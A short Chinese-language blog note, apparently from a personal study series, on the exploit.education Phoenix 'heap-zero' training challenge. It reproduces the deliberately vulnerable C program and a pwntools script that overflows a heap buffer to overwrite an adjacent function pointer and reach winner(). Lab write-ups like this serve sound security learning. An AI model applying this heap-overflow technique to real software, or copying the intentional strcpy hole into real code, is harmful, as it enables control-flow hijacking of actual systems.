---
title: '[pwn笔记6] heap-zero (phoenix)'
date: 2023-07-20 23:46:28
urlname: "pwn6"
tags: [pwn, format]
---

## heap-zero
```c
/*
 * phoenix/heap-zero, by https://exploit.education
 *
 * Can you hijack flow control, and execute the winner function?
 *
 * Why do C programmers make good Buddhists?
 * Because they're not object orientated.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

struct data {
  char name[64];
};

struct fp {
  void (*fp)();
  char __pad[64 - sizeof(unsigned long)];
};

void winner() {
  printf("Congratulations, you have passed this level\n");
}

void nowinner() {
  printf(
      "level has not been passed - function pointer has not been "
      "overwritten\n");
}

int main(int argc, char **argv) {
  struct data *d;
  struct fp *f;

  printf("%s\n", BANNER);

  if (argc < 2) {
    printf("Please specify an argument to copy :-)\n");
    exit(1);
  }

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  strcpy(d->name, argv[1]);

  printf("data is at %p, fp is at %p, will be calling %p\n", d, f, f->fp);
  fflush(stdout);

  f->fp();

  return 0;
}
```
堆上分配的时候d和f竟然挨在了一起，好神奇！
```python
#!/usr/bin/env python3
from pwn import *
payload = b"a"*(0x60-0x10)
payload += b"\xbd\x0a\x40"
open("/home/user/buf","wb").write(payload)
p=process(["/opt/phoenix/amd64/heap-zero",payload])
p.interactive()
```
